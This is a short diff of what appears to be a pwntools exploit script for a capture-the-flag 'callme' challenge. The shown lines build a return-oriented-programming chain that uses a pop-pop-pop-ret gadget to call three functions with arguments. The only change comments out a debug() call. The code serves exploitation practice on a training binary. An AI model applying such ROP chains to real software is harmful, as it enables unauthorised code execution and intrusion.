@@ -59,7 +59,7 @@ payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)
 payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)
 payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) 
 
-debug()
+# debug()
 sl(payload)
 
 p.interactive()
